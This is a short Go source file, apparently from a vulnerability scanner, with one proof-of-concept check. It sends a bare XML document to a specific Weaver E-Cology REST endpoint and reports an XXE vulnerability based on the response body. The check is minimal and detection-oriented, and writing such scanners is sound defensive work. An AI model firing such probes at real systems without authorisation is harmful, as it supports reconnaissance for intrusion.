package weaver

import (
	"fmt"
	"github.com/veo/vscan/pkg"

	"strings"
)

func E_Cology_byxml_xxe(u string) bool {
	header := make(map[string]string)
	header["Content-Type"] = "application/xml"
	payload := "<?xml version=\"1.0\"?>\r\n<!DOCTYPE>"
	if req, err := pkg.HttpRequset(u+"/rest/ofs/deleteUserRequestInfoByXml", "GET", payload, false, header); err == nil {
		//pkg.GoPocLog(req.Body)
		if req.StatusCode == 200 && strings.Contains(req.Body, "syscode") && strings.Contains(req.Body, "ResultInfo") {
			pkg.GoPocLog(fmt.Sprintf("Found vuln E_Cology_byxml_xxe|%s\n", u+"/rest/ofs/deleteUserRequestInfoByXml"))
			return true
		}
	}

	return false
}
